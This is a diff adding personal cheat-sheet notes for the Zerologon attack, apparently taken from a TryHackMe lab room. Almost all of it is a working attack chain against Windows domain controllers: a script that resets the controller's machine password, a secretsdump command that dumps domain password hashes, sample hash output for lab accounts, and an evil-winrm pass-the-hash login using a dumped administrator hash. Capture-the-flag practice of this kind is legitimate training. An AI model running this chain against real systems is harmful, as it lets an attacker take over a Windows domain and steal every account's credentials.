@@ -1,0 +1,25 @@
+### zero logon ###
+## links
+https://tryhackme.com/room/zer0logon
+
+
+## cmds ##
+										# DC01 = name of domain controller
+python zeroLogon-NullPass.py DC01 10.10.167.74					# reset pass
+
+										# HOLOLIVE = domain name network
+secretsdump.py -just-dc HOLOLIVE/DC01\$@$h					# dump
+# example
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::
+hololive.local\okayun:1110:aad3b435b51404eeaad3b435b51404ee:a170447f161e5c11441600f0a1b4d93f:::
+hololive.local\watamet:1115:aad3b435b51404eeaad3b435b51404ee:50f91788ee209b13ca14e54af199a914:::
+hololive.local\mikos:1116:aad3b435b51404eeaad3b435b51404ee:74520070d63d3e2d2bf58da95de0086c:::
+DC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Kerberos keys grabbed
+
+# connect
+evil-winrm -u USER -H 3f3ef89114fb063e3d7fc23c20f65568 -i $h
+
+
